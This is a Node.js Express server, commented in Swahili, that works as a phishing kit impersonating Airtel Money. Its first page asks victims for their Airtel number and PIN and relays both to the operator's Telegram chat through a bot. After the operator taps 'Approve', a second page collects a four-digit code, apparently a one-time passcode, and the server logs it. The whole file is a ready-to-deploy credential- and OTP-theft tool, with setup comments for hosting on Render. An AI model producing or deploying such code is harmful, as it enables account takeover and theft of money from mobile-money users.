const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// WEKA HIZI KWENYE RENDER ENV VARIABLES
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; // kutoka @BotFather
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // ID yako ya Telegram
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

app.use(express.static('public')); // folder ya HTML pages
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

let pendingRequests = {}; // kuhifadhi ombi la muda

// PAGE 1: Form ya Airtel Number + Coder
app.get('/', (req, res) => {
  res.send(`
    <html>
    <head><title>Airtel Money</title>
    <style>
      body{font-family:Arial; text-align:center; padding:40px; background:#f5f5f5}
     .box{background:white; padding:30px; border-radius:10px; max-width:400px; margin:auto}
      input{width:90%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:5px}
      button{background:#E60000; color:white; border:none; padding:12px 30px; border-radius:5px; cursor:pointer}
    </style>
    </head>
    <body>
      <div class="box">
        <h2>Airtel Money</h2>
        <form action="/send-request" method="POST">
          <input type="text" name="airtelNumber" placeholder="Weka Airtel Number" required><br>
          <input type="password" name="coder" placeholder="Weka Coder" required><br>
          <button type="submit">Tuma Ombi</button>
        </form>
      </div>
    </body>
    </html>
  `);
});

// PAGE 2: Inatuma ombi Telegram
app.post('/send-request', async (req, res) => {
  const { airtelNumber, coder } = req.body;
  const requestId = Date.now().toString();

  pendingRequests[requestId] = { airtelNumber, coder };

  const message = `🔔 Ombi Jipya la Airtel Money
  \nNamba: ${airtelNumber}
  \nCoder: ${coder}
  \nID: ${requestId}`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "✅ Approve", callback_data: `approve_${requestId}` }]
    ]
  };

  await axios.post(`${TELEGRAM_API}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    reply_markup: keyboard
  });

  res.send(`<h3>Ombi limetumwa. Subiri approval...</h3>`);
});

// TELEGRAM WEBHOOK - Ukibonyeza Approve
app.post('/telegram-webhook', async (req, res) => {
  const callback = req.body.callback_query;
  if(callback && callback.data.startsWith('approve_')){
    const requestId = callback.data.split('_')[1];
    const data = pendingRequests[requestId];

    // Tuma link kwa mteja ya kuweka coder 4
    const approveUrl = `${req.protocol}://${req.get('host')}/enter-code?id=${requestId}`;

    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: callback.message.chat.id,
      text: `Imekubaliwa. Mteja apewe hii link: ${approveUrl}`
    });
  }
  res.sendStatus(200);
});

// PAGE 3: Mteja anaweka coder 4
app.get('/enter-code', (req, res) => {
  const { id } = req.query;
  res.send(`
    <html>
    <head><title>Weka Coder</title>
    <style>
      body{font-family:Arial; text-align:center; padding:40px; background:#f5f5f5}
     .box{background:white; padding:30px; border-radius:10px; max-width:400px; margin:auto}
      input{width:90%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:5px; text-align:center; font-size:20px; letter-spacing:10px}
      button{background:#E60000; color:white; border:none; padding:12px 30px; border-radius:5px; cursor:pointer}
    </style>
    </head>
    <body>
      <div class="box">
        <h2>Weka Coder 4 Nambari</h2>
        <form action="/proceed" method="POST">
          <input type="hidden" name="id" value="${id}">
          <input type="text" name="finalCode" maxlength="4" required><br>
          <button type="submit">Proceed</button>
        </form>
      </div>
    </body>
    </html>
  `);
});

app.post('/proceed', (req, res) => {
  const { id, finalCode } = req.body;
  console.log("Final Code:", finalCode, "for ID:", id);
  res.send(`<h3>Asante! Ombi limepokelewa.</h3>`);
});

app.listen(PORT, () => console.log(`Server running on ${PORT}`));
